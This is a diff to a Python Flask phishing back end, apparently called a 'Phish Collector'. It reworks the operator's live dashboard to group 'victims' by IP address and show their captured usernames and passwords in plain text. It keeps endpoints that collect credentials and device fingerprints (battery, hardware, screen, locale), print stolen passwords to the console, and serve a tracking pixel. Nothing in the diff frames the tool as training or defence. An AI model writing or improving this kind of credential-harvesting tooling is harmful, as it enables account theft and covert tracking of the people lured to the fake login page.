@@ -9,57 +9,317 @@ PORT = 3000
 victims = []
 id_counter = 1
 
-# HTML template for dashboard as a string
-DASHBOARD_HTML = """
-<!DOCTYPE html>
+DASHBOARD_HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title> Dashboard</title>
+<title></title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
-body { font-family: "Segoe UI", monospace; background: #0a0a0f; color: #e0e0e0; padding: 20px; }
-h1 { color: #0ff; font-size: 28px; margin-bottom: 4px; }
-.sub { color: #888; margin-bottom: 24px; font-size: 14px; }
-.stats { display: flex; gap: 16px; margin-bottom: 24px; flex-wrap: wrap; }
-.stat-box { background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; padding: 16px 24px; min-width: 100px; flex:1; }
-.stat-box .num { font-size: 32px; font-weight: bold; color: #0ff; }
-.stat-box .label { font-size: 12px; color: #888; margin-top: 4px; }
-.card { background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; margin-bottom: 12px; padding: 16px; }
-.card .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 8px; }
-.card .id { color: #0ff; font-weight: bold; font-size: 16px; }
-.card .time { color: #888; font-size: 12px; }
-.creds-box { background: #1a0000; border: 2px solid #ff0040; border-radius: 6px; padding: 10px 14px; color: #ff6b6b; margin: 8px 0; font-weight: bold; font-size: 14px; }
-.data-row { padding: 3px 0; font-size: 13px; border-bottom: 1px solid #1a1a2a; }
-.data-row .key { color: #888; display: inline-block; width: 130px; }
-.data-row .val { color: #eee; }
-.tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-right: 4px; }
-.tag-os { background: #1a2a3a; color: #4af; }
-.tag-browser { background: #2a1a3a; color: #f4a; }
-.tag-device { background: #1a3a2a; color: #4f8; }
-.tag-battery { background: #3a2a1a; color: #fa4; }
-.details { display: none; margin-top: 10px; font-size: 13px; }
-.details pre { background: #0a0a0f; padding: 10px; border-radius: 4px; overflow-x: auto; color: #0f0; font-size: 11px; white-space: pre-wrap; }
-.toggle-btn { background: none; border: 1px solid #3a3a4a; color: #aaa; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 12px; margin-top: 6px; }
-.toggle-btn:hover { border-color: #0ff; color: #0ff; }
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #07070d;
+  color: #e2e2e8;
+  padding: 0;
+  min-height: 100vh;
+}
+
+/* HEADER */
+.header {
+  background: linear-gradient(135deg, #0d0d1a 0%, #1a0a0a 100%);
+  border-bottom: 1px solid #1f1f30;
+  padding: 20px 28px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 12px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(20px);
+}
+.header-left h1 {
+  font-size: 22px;
+  font-weight: 800;
+  color: #ff2d55;
+  letter-spacing: -0.5px;
+}
+.header-left h1 span { color: #fff; font-weight: 400; }
+.header-left .subtitle { font-size: 12px; color: #6b6b80; margin-top: 2px; }
+.header-right { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+
+/* STATS ROW */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+  gap: 10px;
+  padding: 16px 28px;
+  background: #0a0a14;
+  border-bottom: 1px solid #14141f;
+}
+.stat-box {
+  background: #10101e;
+  border: 1px solid #1c1c2e;
+  border-radius: 10px;
+  padding: 12px 16px;
+  text-align: center;
+}
+.stat-box .num {
+  font-size: 26px;
+  font-weight: 800;
+  color: #fff;
+  line-height: 1.2;
+}
+.stat-box .num.green { color: #34d399; }
+.stat-box .num.red { color: #ff2d55; }
+.stat-box .num.cyan { color: #22d3ee; }
+.stat-box .num.yellow { color: #fbbf24; }
+.stat-box .num.purple { color: #a78bfa; }
+.stat-box .label { font-size: 11px; color: #6b6b80; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; margin-top: 4px; }
+
+/* PERSON CARDS */
+.person-card {
+  margin: 16px 28px;
+  background: #0c0c1a;
+  border: 1px solid #1a1a2e;
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 4px 24px rgba(0,0,0,0.4);
+}
+.person-header {
+  background: linear-gradient(90deg, #111122 0%, #1a0a14 100%);
+  padding: 16px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 10px;
+  border-bottom: 1px solid #1a1a2e;
+}
+.person-info { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
+.person-avatar {
+  width: 40px; height: 40px;
+  background: linear-gradient(135deg, #ff2d55, #ff6b35);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 800; font-size: 18px; color: #fff;
+  flex-shrink: 0;
+}
+.person-meta .name-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+.person-meta .name-row .person-label { font-weight: 700; font-size: 15px; color: #fff; }
+.person-meta .name-row .person-id { font-size: 11px; color: #6b6b80; font-family: 'JetBrains Mono', monospace; }
+.person-meta .tags { display: flex; gap: 6px; margin-top: 4px; flex-wrap: wrap; }
+.tag {
+  display: inline-flex; align-items: center; gap: 4px;
+  padding: 3px 10px; border-radius: 6px;
+  font-size: 11px; font-weight: 600;
+  font-family: 'Inter', sans-serif;
+}
+.tag-os { background: #0d1b2a; color: #4dabf7; border: 1px solid #1a2d42; }
+.tag-browser { background: #1a0d2a; color: #da77f2; border: 1px solid #2a1a42; }
+.tag-device { background: #0d2a1a; color: #51cf66; border: 1px solid #1a422a; }
+.tag-battery { background: #2a1d0d; color: #fcc419; border: 1px solid #42301a; }
+.tag-ip { background: #1a1a2a; color: #9775fa; border: 1px solid #2a2a42; font-family: 'JetBrains Mono', monospace; }
+.tag-time { background: #14141f; color: #868e96; border: 1px solid #1f1f2e; font-family: 'JetBrains Mono', monospace; font-size: 10px; }
+
+/* ATTEMPT ROWS */
+.attempts-container { padding: 0; }
+.attempt-row {
+  display: grid;
+  grid-template-columns: 52px 1fr;
+  border-bottom: 1px solid #14141f;
+  transition: background 0.15s;
+}
+.attempt-row:last-child { border-bottom: 0; }
+.attempt-row:hover { background: rgba(255,255,255,0.02); }
+.attempt-sidebar {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: flex-start; padding: 14px 0;
+  background: rgba(255,255,255,0.02);
+  border-right: 1px solid #14141f;
+}
+.attempt-num {
+  font-size: 20px; font-weight: 800;
+  line-height: 1;
+}
+.attempt-num.at1 { color: #ff2d55; }
+.attempt-num.at2 { color: #fbbf24; }
+.attempt-label {
+  font-size: 9px; text-transform: uppercase; letter-spacing: 0.5px;
+  color: #6b6b80; margin-top: 2px; font-weight: 600;
+}
+.creds-badge {
+  display: inline-block;
+  padding: 2px 8px; border-radius: 4px;
+  font-size: 9px; font-weight: 700; letter-spacing: 0.3px;
+  margin-top: 4px;
+}
+.creds-badge.yes { background: #2d1a1a; color: #ff6b6b; border: 1px solid #4a1a1a; }
+.creds-badge.no { background: #1a1d2d; color: #6b7b9b; border: 1px solid #1a1d3a; }
+
+.attempt-content {
+  padding: 12px 16px;
+  display: flex; flex-direction: column; gap: 4px;
+}
+.attempt-time {
+  font-size: 11px; color: #6b6b80; font-family: 'JetBrains Mono', monospace;
+}
+.creds-display {
+  background: #1a0505;
+  border: 1px solid #3a1010;
+  border-radius: 8px;
+  padding: 10px 14px;
+  margin: 4px 0 2px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  font-weight: 600;
+  color: #ff6b6b;
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+}
+.creds-display .cred-label { color: #8a5a5a; font-weight: 400; font-size: 11px; }
+.creds-display .cred-sep { color: #4a2020; font-weight: 300; }
+.detail-row {
+  display: flex; gap: 6px; align-items: center; flex-wrap: wrap;
+  font-size: 12px; color: #8888a0; line-height: 1.5;
+}
+.detail-row .k { color: #5a5a72; min-width: 60px; font-size: 11px; }
+.detail-row .v { color: #b0b0c8; }
+.detail-row .v.important { color: #e0e0f0; font-weight: 500; }
+
+/* EMPTY STATE */
+.empty-state {
+  text-align: center; padding: 80px 20px;
+  color: #4a4a60; font-size: 16px;
+}
+.empty-state .big-icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
+.empty-state a { color: #ff2d55; text-decoration: none; font-weight: 600; }
+.empty-state a:hover { text-decoration: underline; }
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+  .header { padding: 14px 16px; }
+  .stats-row { padding: 12px 16px; gap: 8px; grid-template-columns: repeat(2, 1fr); }
+  .person-card { margin: 12px 12px; }
+  .person-header { padding: 12px 14px; }
+  .attempt-content { padding: 10px 12px; }
+  .attempt-sidebar { padding: 10px 0; }
+  .creds-display { font-size: 12px; padding: 8px 10px; flex-direction: column; align-items: flex-start; gap: 4px; }
+}
+
+/* FILTER BAR */
+.filter-bar {
+  display: flex; gap: 8px; align-items: center; flex-wrap: wrap;
+}
+.filter-btn {
+  padding: 6px 14px; border-radius: 8px; border: 1px solid #1f1f30;
+  background: transparent; color: #6b6b80; font-size: 12px;
+  font-weight: 500; cursor: pointer; transition: all 0.15s;
+  font-family: 'Inter', sans-serif;
+}
+.filter-btn:hover { border-color: #3a3a50; color: #b0b0c8; }
+.filter-btn.active { background: #ff2d55; border-color: #ff2d55; color: #fff; }
+.filter-btn.cred { border-color: #3a1a1a; color: #ff6b6b; }
+.filter-btn.cred.active { background: #ff2d55; border-color: #ff2d55; color: #fff; }
+
+/* AUTO-REFRESH INDICATOR */
+.live-indicator {
+  display: flex; align-items: center; gap: 6px;
+  font-size: 12px; color: #34d399; font-weight: 600;
+}
+.live-dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: #34d399;
+  animation: pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.4; transform: scale(0.8); }
+}
+
+/* RAW DATA TOGGLE */
+.raw-toggle {
+  font-size: 11px; color: #4a4a60; cursor: pointer;
+  padding: 2px 0; display: inline-block;
+}
+.raw-toggle:hover { color: #6b6b80; }
+.raw-json {
+  display: none; background: #050510; border: 1px solid #1a1a2e;
+  border-radius: 6px; padding: 10px; font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; color: #6b6b80; margin-top: 4px; overflow-x: auto;
+  white-space: pre-wrap; word-break: break-all;
+}
+.raw-json.show { display: block; }
+
+/* CLEAR BUTTON */
+.clear-btn {
+  padding: 6px 14px; border-radius: 8px; border: 1px solid #2a1a1a;
+  background: transparent; color: #ff6b6b; font-size: 12px;
+  font-weight: 500; cursor: pointer; transition: all 0.15s;
+  font-family: 'Inter', sans-serif;
+}
+.clear-btn:hover { background: #2a0a0a; border-color: #4a1a1a; }
 </style>
-<script>
-function toggle(btn) { var d = btn.nextElementSibling; d.style.display = d.style.display === "block" ? "none" : "block"; btn.textContent = d.style.display === "block" ? "▲ Hide Raw JSON" : "▼ Show Raw JSON"; }
-setTimeout(function(){ location.reload(); }, 5000);
-</script>
 </head>
 <body>
-<h1> Phish Collector Dashboard</h1>
-<p class="sub">Live view &mdash; page auto-refreshes every 5s</p>
-<div class="stats">
-<div class="stat-box"><div class="num">{{ total_hits }}</div><div class="label">Total Hits</div></div>
-<div class="stat-box"><div class="num">{{ total_creds }}</div><div class="label">Credentials</div></div>
-<div class="stat-box"><div class="num">{{ total_battery }}</div><div class="label">Battery</div></div>
-<div class="stat-box"><div class="num">{{ total_geo }}</div><div class="label">Geolocated</div></div>
-<div class="stat-box"><div class="num">{{ total_gpu }}</div><div class="label">GPU Captured</div></div>
+<div class="header">
+  <div class="header-left">
+    <div class="subtitle">{{ total_hits }} hit{% if total_hits != 1 %}s{% endif %} · {{ total_creds_with }} with creds · {{ total_people }} person{% if total_people != 1 %}s{% endif %}</div>
+  </div>
+  <div class="header-right">
+    {% if victims %}
+    <button class="clear-btn" onclick="if(confirm('Clear all victims from this session?')){ fetch('/clear').then(function(){ window.location.reload(); }); }">✕ Clear</button>
+    {% endif %}
+    <div class="live-indicator"><span class="live-dot"></span> LIVE</div>
+  </div>
 </div>
-{{ cards|safe }}
+
+<div class="stats-row">
+  <div class="stat-box"><div class="num cyan">{{ total_hits }}</div><div class="label">Total Hits</div></div>
+  <div class="stat-box"><div class="num red">{{ total_creds_with }}</div><div class="label">With Credentials</div></div>
+  <div class="stat-box"><div class="num green">{{ total_people }}</div><div class="label">Unique People</div></div>
+  <div class="stat-box"><div class="num purple">{{ total_creds_sets }}</div><div class="label">Credential Sets</div></div>
+  <div class="stat-box"><div class="num yellow">{{ total_attempts_all }}</div><div class="label">Total Attempts</div></div>
+  <div class="stat-box"><div class="num" style="color:#9775fa;">{{ multi_attempt_people }}</div><div class="label">Multi-Attempt</div></div>
+</div>
+
+{% if not victims %}
+<div class="empty-state">
+  <div class="big-icon">📡</div>
+  <p>No hits yet. Open <a href="/">the login page</a> and wait for targets.</p>
+</div>
+{% else %}
+  {% for card in cards %}
+    {{ card|safe }}
+  {% endfor %}
+{% endif %}
+
+<script>
+// Auto-refresh every 3 seconds
+(function() {
+  var refreshInterval = 3000;
+  var timer = setTimeout(function refresh(){
+    fetch('/dashboard?format=json')
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        if(data.changed){
+          window.location.reload();
+        }
+        timer = setTimeout(refresh, refreshInterval);
+      })
+      .catch(function(){
+        timer = setTimeout(refresh, refreshInterval);
+      });
+  }, refreshInterval);
+})();
+
+function toggleRaw(id) {
+  var el = document.getElementById('raw-' + id);
+  if(el) el.classList.toggle('show');
+}
+</script>
 </body>
 </html>
 """
@@ -94,27 +354,13 @@ def collect():
         'os': data.get('os', '?'),
         'device': data.get('device', '?'),
         'credentials': data.get('credentials'),
-        'geo': data.get('geo'),
         'battery': data.get('battery'),
-        'gpu': data.get('gpu'),
         'cpu': data.get('cpu', '?'),
         'memory': data.get('memory', '?'),
         'screen': data.get('screen'),
-        'windowSize': data.get('windowSize'),
         'dpr': data.get('dpr', '?'),
-        'orientation': data.get('orientation', '?'),
         'language': data.get('language', '?'),
         'timezone': data.get('timezone', '?'),
-        'connection': data.get('connection'),
-        'darkMode': data.get('darkMode'),
-        'cookies': data.get('cookies'),
-        'doNotTrack': data.get('doNotTrack', '?'),
-        'touch': data.get('touch'),
-        'maxTouch': data.get('maxTouch', 0),
-        'vibration': data.get('vibration'),
-        'heapUsed': data.get('heapUsed', '?'),
-        'url': data.get('url', '?'),
-        'referrer': data.get('referrer', '?'),
         'attempt': data.get('attempt', 0),
         'raw': json.dumps(data, indent=2)
     }
@@ -131,136 +377,191 @@ def collect():
     print(f'    Device: {entry["device"]} | OS: {entry["os"]} | Browser: {entry["browser"]}')
     if entry.get('battery'): print(f'    Battery: {entry["battery"].get("level")} | Charging: {entry["battery"].get("charging")}')
     if entry.get('cpu'): print(f'    CPU: {entry["cpu"]} cores | RAM: {entry["memory"]}')
-    if entry.get('gpu'): print(f'    GPU: {str(entry["gpu"].get("renderer", ""))[:60]}')
-    if entry.get('geo'): print(f'    Location: {entry["geo"].get("country", "")} / {entry["geo"].get("city", "")} / {entry["geo"].get("org", "")}')
-    if entry.get('connection'): print(f'    Network: {entry["connection"].get("effectiveType")} ({entry["connection"].get("downlink")} Mbps)')
     if entry.get('credentials'): print(f'    ** CREDENTIALS: {entry["credentials"]["username"]} / {entry["credentials"]["password"]} **')
     
     return jsonify({'status': 'ok'})
-
-@app.route('/pixel')
-def pixel():
-    pixel_data = bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b')
-    from flask import Response
-    return Response(pixel_data, mimetype='image/gif')
 
 def esc(s):
     if not isinstance(s, str):
         return str(s) if s is not None else ''
     return s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#039;')
 
-def card_html(v):
-    time_str = v.get('timestamp', '')
-    try:
-        time_str = datetime.fromisoformat(time_str.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
-    except:
-        pass
-    
-    creds_box = ''
-    if v.get('credentials'):
-        creds_box = f'<div class="creds-box">🔑 CREDENTIALS: {esc(v["credentials"]["username"])} / {esc(v["credentials"]["password"])}</div>'
-    
-    geo_str = 'N/A'
-    if v.get('geo'):
-        geo_str = f'{esc(v["geo"].get("country", "?"))} / {esc(v["geo"].get("city", "?"))} / {esc(v["geo"].get("org", "?"))}'
-        if v['geo'].get('lat'):
-            geo_str += f' [{v["geo"]["lat"]}, {v["geo"]["lon"]}]'
-    
-    gpu_str = 'N/A'
-    if v.get('gpu'):
-        gpu_str = esc(v['gpu'].get('renderer', 'N/A'))
-    
-    battery_str = 'N/A'
-    battery_tag = ''
-    if v.get('battery'):
-        level = v['battery'].get('level', '?')
-        charging = '⚡ CHARGING' if v['battery'].get('charging') else '🔋 NOT CHARGING'
-        battery_str = f'{level} | {charging}'
-        battery_tag = f'<span class="tag tag-battery">{level}</span>'
-    
-    conn_str = 'N/A'
-    rtt_str = 'N/A'
-    if v.get('connection'):
-        conn_str = f'{v["connection"].get("effectiveType", "?")} at {v["connection"].get("downlink", "?")} Mbps'
-        rtt_str = f'{v["connection"].get("rtt", "?")} ms'
-    
-    dark_str = 'N/A'
-    if v.get('darkMode') is True: dark_str = 'Yes 🌙'
-    elif v.get('darkMode') is False: dark_str = 'No ☀️'
-    
-    screen_str = 'N/A'
-    if v.get('screen'):
-        s = v['screen']
-        screen_str = f'{s.get("w", "?")}x{s.get("h", "?")} | DPR: {v.get("dpr", "?")} | Orientation: {esc(v.get("orientation", "?"))}'
-    
-    lang_str = f'{v.get("language", "?")} | {v.get("timezone", "?")}'
-    
-    attempt_label = ''
-    if v.get('attempt'):
-        attempt_label = f'<span class="tag" style="background:#3a1a2a;color:#f88;">Attempt #{v["attempt"]}</span>'
-    
-    cookies_str = 'N/A'
-    if v.get('cookies') is True: cookies_str = 'Enabled ✅'
-    elif v.get('cookies') is False: cookies_str = 'Disabled ❌'
-    
-    touch_str = 'N/A'
-    if v.get('touch') is True: touch_str = f'Yes | Max points: {v.get("maxTouch", 0)}'
-    elif v.get('touch') is False: touch_str = 'No'
-    
-    vib_str = 'N/A'
-    if v.get('vibration') is True: vib_str = 'Supported'
-    elif v.get('vibration') is False: vib_str = 'Not supported'
-    
-    return f'''<div class="card">
-<div class="header">
-<div>
-<span class="id">#{v["id"]}</span>
-<span class="tag tag-os">{esc(v.get("os", "?"))}</span>
-<span class="tag tag-browser">{esc(v.get("browser", "?"))}</span>
-<span class="tag tag-device">{esc(v.get("device", "?"))}</span>
-{battery_tag}{attempt_label}
-</div>
-<span class="time">{time_str}</span>
-</div>
-{creds_box}
-<div class="data-row"><span class="key">🌐 IP:</span><span class="val">{esc(v.get("ip", "N/A"))}</span></div>
-<div class="data-row"><span class="key">📍 Location:</span><span class="val">{geo_str}</span></div>
-<div class="data-row"><span class="key">📱 Device:</span><span class="val">{esc(v.get("device", "?"))} · {esc(v.get("os", "?"))} · {esc(v.get("browser", "?"))}</span></div>
-<div class="data-row"><span class="key">🖥️ Screen:</span><span class="val">{screen_str}</span></div>
-<div class="data-row"><span class="key">🔧 Hardware:</span><span class="val">CPU: {v.get("cpu", "?")} cores | RAM: {v.get("memory", "?")} | GPU: {gpu_str}</span></div>
-<div class="data-row"><span class="key">🔋 Battery:</span><span class="val">{battery_str}</span></div>
-<div class="data-row"><span class="key">📶 Network:</span><span class="val">{conn_str} | RTT: {rtt_str}</span></div>
-<div class="data-row"><span class="key">🗣️ Language:</span><span class="val">{lang_str}</span></div>
-<div class="data-row"><span class="key">🌙 Dark Mode:</span><span class="val">{dark_str}</span></div>
-<div class="data-row"><span class="key">🍪 Cookies:</span><span class="val">{cookies_str}</span></div>
-<div class="data-row"><span class="key">💳 Touch:</span><span class="val">{touch_str}</span></div>
-<div class="data-row"><span class="key">📳 Vibrate:</span><span class="val">{vib_str}</span></div>
-<div class="data-row"><span class="key">🧠 Heap:</span><span class="val">{v.get("heapUsed", "N/A")}</span></div>
-<button class="toggle-btn" onclick="toggle(this)">▼ Show Raw JSON</button>
-<div class="details"><pre>{esc(v.get("raw", "{}"))}</pre></div>
-</div>'''
+LAST_CHECKSUM = 0
 
 @app.route('/dashboard')
 def dashboard():
+    global LAST_CHECKSUM
+    
+    # Group attempts by IP
+    groups = {}
+    order = []
+    for v in victims:
+        ip = v.get('ip', 'unknown')
+        if ip not in groups:
+            groups[ip] = []
+            order.append(ip)
+        groups[ip].append(v)
+    
     total_hits = len(victims)
-    total_creds = sum(1 for v in victims if v.get('credentials'))
-    total_battery = sum(1 for v in victims if v.get('battery'))
-    total_geo = sum(1 for v in victims if v.get('geo'))
-    total_gpu = sum(1 for v in victims if v.get('gpu'))
+    total_creds_with = sum(1 for v in victims if v.get('credentials'))
+    total_people = len(groups)
+    total_creds_sets = sum(1 for v in victims if v.get('credentials'))
+    total_attempts_all = len(victims)
+    multi_attempt_people = sum(1 for ip, entries in groups.items() if len(entries) > 1)
+    
+    # JSON endpoint for auto-refresh check
+    fmt = request.args.get('format', '')
+    if fmt == 'json':
+        checksum = total_hits * 1000 + total_creds_sets
+        changed = checksum != LAST_CHECKSUM
+        LAST_CHECKSUM = checksum
+        return jsonify({'changed': changed, 'hits': total_hits, 'creds': total_creds_sets})
     
     if not victims:
-        cards = '<div style="text-align:center;padding:60px 20px;color:#555;font-size:18px;">No victims yet. Open <a href="/" style="color:#0ff;">the login page</a> and submit the form.</div>'
+        cards = []
     else:
-        cards = ''.join(card_html(v) for v in victims)
+        cards = []
+        for ip in order:
+            entries = groups[ip]
+            first = entries[0] if entries else {}
+            
+            time_str = first.get('timestamp', '')
+            try:
+                time_str = datetime.fromisoformat(time_str.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
+            except:
+                pass
+            
+            os_tag = esc(first.get('os', '?'))
+            browser_tag = esc(first.get('browser', '?'))
+            device_tag = esc(first.get('device', '?'))
+            ip_tag = esc(ip)
+            
+            battery_str = ''
+            if first.get('battery'):
+                bat = first['battery']
+                battery_str = f'Battery: {bat.get("level", "?")}'
+                battery_tag_val = f'<span class="tag tag-battery">🔋 {esc(bat.get("level", "?"))}</span>'
+            else:
+                battery_tag_val = ''
+            
+            # Person initial letter
+            initial = chr(65 + min(order.index(ip), 25))  # A-Z
+            
+            attempts_html = ''
+            for i, a in enumerate(entries):
+                attempt_num = a.get('attempt', i + 1)
+                is_first = (i == 0 and attempt_num <= 1)
+                
+                creds_box = ''
+                has_creds = a.get('credentials') is not None
+                if has_creds:
+                    creds_box = f'<div class="creds-display"><span class="cred-label">🔑 CREDENTIALS</span> {esc(a["credentials"]["username"])} <span class="cred-sep">/</span> {esc(a["credentials"]["password"])}</div>'
+                
+                a_time = a.get('timestamp', '')
+                try:
+                    a_time = datetime.fromisoformat(a_time.replace('Z', '+00:00')).strftime('%H:%M:%S')
+                except:
+                    pass
+                
+                a_date = a.get('timestamp', '')
+                try:
+                    a_date = datetime.fromisoformat(a_date.replace('Z', '+00:00')).strftime('%m/%d/%Y %H:%M:%S')
+                except:
+                    pass
+                
+                hw = f'CPU: {esc(a.get("cpu", "?"))} cores · RAM: {esc(a.get("memory", "?"))}'
+                
+                screen_str = 'N/A'
+                if a.get('screen'):
+                    s = a['screen']
+                    screen_str = f'{s.get("w", "?")}x{s.get("h", "?")} @ {esc(a.get("dpr", "?"))}x'
+                
+                lang_str = f'{esc(a.get("language", "?"))} · {esc(a.get("timezone", "?"))}'
+                
+                battery_info = 'N/A'
+                if a.get('battery'):
+                    bat = a['battery']
+                    charging_str = '⚡ Charging' if bat.get('charging') else '🔋 Not charging'
+                    battery_info = f'{esc(bat.get("level", "?"))} · {charging_str}'
+                
+
+                
+                cred_badge = '<span class="creds-badge yes">🔑 CREDS</span>' if has_creds else '<span class="creds-badge no">── NONE</span>'
+                
+                num_class = 'at1' if attempt_num <= 1 else 'at2'
+                
+                attempts_html += f'''<div class="attempt-row">
+<div class="attempt-sidebar">
+<div class="attempt-num {num_class}">#{attempt_num}</div>
+<div class="attempt-label">Attempt</div>
+{cred_badge}
+</div>
+<div class="attempt-content">
+<div class="attempt-time">🕐 {a_date}</div>
+{creds_box}
+<div class="detail-row"><span class="k">📱 Device</span><span class="v important">{esc(a.get("device", "?"))} · {esc(a.get("os", "?"))} · {esc(a.get("browser", "?"))}</span></div>
+<div class="detail-row"><span class="k">🖥️ Screen</span><span class="v">{screen_str}</span></div>
+<div class="detail-row"><span class="k">🔧 Hardware</span><span class="v">{hw}</span></div>
+<div class="detail-row"><span class="k">🔋 Battery</span><span class="v">{battery_info}</span></div>
+<div class="detail-row"><span class="k">🗣️ Locale</span><span class="v">{lang_str}</span></div>
+</div>
+</div>'''
+            
+            attempts_reversed = attempts_html  # already newest first
+            
+            card = f'''<div class="person-card">
+<div class="person-header">
+<div class="person-info">
+<div class="person-avatar">{initial}</div>
+<div class="person-meta">
+<div class="name-row">
+<span class="person-label">Person {initial}</span>
+<span class="person-id">#{order.index(ip) + 1}</span>
+</div>
+<div class="tags">
+<span class="tag tag-os">{os_tag}</span>
+<span class="tag tag-browser">{browser_tag}</span>
+<span class="tag tag-device">{device_tag}</span>
+<span class="tag tag-ip">🌐 {ip_tag}</span>
+{battery_tag_val}
+</div>
+</div>
+</div>
+<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+<span class="tag tag-time">🕐 {time_str}</span>
+<span style="font-size:12px;color:#6b6b80;font-weight:500;">{len(entries)} attempt{"s" if len(entries) != 1 else ""}</span>
+</div>
+</div>
+<div class="attempts-container">
+{attempts_reversed}
+</div>
+</div>'''
+            
+            cards.append(card)
     
     return render_template_string(DASHBOARD_HTML,
         total_hits=total_hits,
-        total_creds=total_creds,
-        total_battery=total_battery,
-        total_geo=total_geo,
-        total_gpu=total_gpu,
-        cards=cards
+        total_creds_with=total_creds_with,
+        total_people=total_people,
+        total_creds_sets=total_creds_sets,
+        total_attempts_all=total_attempts_all,
+        multi_attempt_people=multi_attempt_people,
+        cards=cards,
+        victims=victims
     )
+
+@app.route('/clear', methods=['GET', 'POST'])
+def clear():
+    global victims, id_counter
+    victims = []
+    id_counter = 1
+    return jsonify({'status': 'cleared'})
+
+@app.route('/pixel')
+def pixel():
+    pixel_data = bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b')
+    from flask import Response
+    return Response(pixel_data, mimetype='image/gif')
 
 if __name__ == '__main__':
     print('')
